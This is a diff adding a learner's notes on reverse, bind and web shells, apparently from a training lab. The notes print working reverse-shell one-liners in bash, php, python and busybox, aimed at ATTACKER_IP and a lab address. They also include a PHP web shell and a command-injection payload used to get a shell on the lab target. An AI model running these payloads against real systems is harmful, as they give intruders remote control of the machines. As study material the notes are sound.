@@ -1,0 +1,90 @@
+What is a shell
+    -> software that allows a user to interact with an OS
+    -> usually command line (CLI), but can be graphical (GUI)
+    -> attackers use it for various purposes:
+        -> remote control, privilege escalation, data exfiltration
+        -> persistence, pivoting (moving laterally through a network)
+
+Note: There are some commands in this writeup that you don't need to fully understand.
+
+Reverse shell
+ -> "connect back shell"
+ -> target initiates a connection to the attacker's machine
+ -> How it works
+    # attacker sets up a listener (eg. with netcat)
+
+    nc -lvnp [port] (commonly port 4444, but many systems block it. Ports below 1024 are privileged, so use higher)
+
+    # attacker executes a reverse shell payload
+    # the payload connects back to the attacker's machine
+    # the following is a bash pipe reverse shell (there are many types)
+
+    # named pipe for i/o, bash shell, netcat listener
+    # you don't need to know why it works (trust me bro)
+
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+
+    #  you can use a website like revshells.com to generate payloads
+    # attacker receives a shell in the terminal where they set up the listener
+
+Bind shell
+ - "connect to shell"
+ - target listens for a connection on a specific port
+ - Possible setup:
+    # named pipe for i/o, bash shell, netcat listener (explained below)
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+
+    # rm-f /tmp/f; removes existing named pipe at /tmp/f
+    # mkfifo /tmp/f; creates a named pipe at /tmp/f
+    # cat /tmp/f/ waits for input to be sent through the pipe
+    # bash -i 2>&1; starts an interactive bash shell, redirecting stderr to stdout (so errors are sent to attacker)
+    # | nc -l 0.0.0.0 8080 starts netcat listener on all interfaces, port 8080
+    # >/tmp/f sends output from netcat back to the named pipe (allows bidirectional communication)
+
+    # attacker connect with
+    nc -nv 10.10.13.37 8080
+
+Shell Listeners
+ - all of these are CLI
+ - rlwrap - small utility using GNU readline library for command history and keyboard editing
+ - ncat - improved netcat build by nmap with extra features such as encryption (SSL)
+ - socat - for socket connection between 2 machines, reverse and bind shells, ... (flexible & advanced)
+
+Shell Payloads
+ - basic bash revshell: bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
+ - php exec revshell: php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+ - short python revshell: PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+    # PY-C because you need python -c
+ - busybox revshell: busybox nc ATTACKER_IP 443 -e sh
+ as you can imagine, there are infinite ways to do this.. we will stop here.
+
+Web Shells
+ = script written in a language supported by a compromised web server
+   that executes commands through the web server itself
+ - example php web shell:
+    <?php
+    if (isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+    ?>
+
+ - you save it to a file and upload it on the server
+ - then you can execute commands by visiting the URL with the cmd parameter
+
+ - you can find them online (be careful), here are some popular web shell sites:
+    - p0wny-shell (minimalistic, php)
+    - c99 (more advanced, php)
+    - b374k (advanced, php)
+
+Practical task
+
+command injection reverse shell:
+;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.114.113.149 8081 >/tmp/f;
+
+webshell:
+used pentestmonkey's php reverse-shell (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+changed ip to ATTACKER_IP and port to 4444
+in terminal i did nc -lvnp 4444
+uploaded the php revshell
+visited http://TARGET_IP:TARGET_PORT/uploads/phpshell.php
+successfully got a reverse shell
